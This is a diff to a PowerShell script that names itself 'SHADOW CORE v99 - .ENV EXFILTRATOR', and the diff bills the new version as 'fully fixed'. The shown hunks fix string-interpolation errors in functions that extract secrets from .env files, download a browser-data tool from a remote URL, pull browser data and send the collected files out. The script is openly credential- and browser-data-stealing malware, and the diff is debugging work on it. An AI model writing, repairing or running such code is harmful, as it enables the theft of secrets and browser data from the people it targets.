@@ -1,6 +1,6 @@
 #Requires -Version 5.1
 # ============================================================
-# SHADOW CORE v99 - .ENV EXFILTRATOR (VERBOSE)
+# SHADOW CORE v99 - .ENV EXFILTRATOR (FULLY FIXED)
 # ============================================================
 
 $ErrorActionPreference = 'Continue'
@@ -377,7 +377,8 @@ function Extract-Secrets {
                 Write-Host "[VERBOSE] [+] Found $($secretsInFile.Count) secrets in: $(Split-Path $filePath -Leaf)" -ForegroundColor Green
             }
         } catch {
-            Write-Host "[VERBOSE] [-] Error extracting secrets from $filePath: $($_.Exception.Message)" -ForegroundColor Red
+            # ===== FIXED: ${filePath} =====
+            Write-Host "[VERBOSE] [-] Error extracting secrets from ${filePath}: $($_.Exception.Message)" -ForegroundColor Red
         }
     }
     
@@ -459,7 +460,6 @@ function Download-BrowserTool {
         $webClient.DownloadFile($BROWSER_DATA_URL, $output)
         Write-Host "[VERBOSE] [+] Downloaded: $output" -ForegroundColor Green
         
-        # Verify the file exists and has a valid size
         if (Test-Path $output) {
             $fileSize = (Get-Item $output).Length
             Write-Host "[VERBOSE] File size: $fileSize bytes" -ForegroundColor Gray
@@ -514,7 +514,6 @@ function Extract-BrowserData {
             Write-Host "[VERBOSE] [+] Found $($foundFiles.Count) browser data files" -ForegroundColor Green
         } else {
             Write-Host "[VERBOSE] [-] No browser data files found." -ForegroundColor Yellow
-            # Check if error.log exists for debugging
             if (Test-Path "$browserDir\error.log") {
                 Write-Host "[VERBOSE] Error log content:" -ForegroundColor Red
                 Get-Content "$browserDir\error.log" | ForEach-Object { Write-Host "[VERBOSE] $_" -ForegroundColor Red }
@@ -568,7 +567,8 @@ function Send-FilesIndividually {
         }
     }
     
-    Write-Host "[VERBOSE] $CategoryName: Sent $sent, Failed $failed" -ForegroundColor Yellow
+    # ===== FIXED: ${CategoryName} =====
+    Write-Host "[VERBOSE] ${CategoryName}: Sent $sent, Failed $failed" -ForegroundColor Yellow
     return @{ Sent = $sent; Failed = $failed }
 }
 
